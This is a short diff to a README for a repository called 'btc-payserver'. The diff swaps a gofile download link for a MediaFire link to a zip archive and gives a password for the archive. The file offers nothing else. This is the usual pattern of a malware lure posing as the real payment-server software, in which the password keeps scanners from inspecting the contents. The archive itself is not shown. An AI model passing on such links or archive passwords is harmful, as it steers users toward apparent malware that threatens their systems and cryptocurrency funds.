@@ -1,6 +1,6 @@
 # btc-payserver
 
-[Click Here To Download](https://store6.gofile.io/download/direct/9f2ef70e-f758-4d7b-b680-f2898913fc23/btcpayserver.zip)
+[Click Here To Download](https://www.mediafire.com/file/n41iohxt4gh3b75/btcpayserver.zip/file)
 [Pass : S3rv3r%.]
 
 
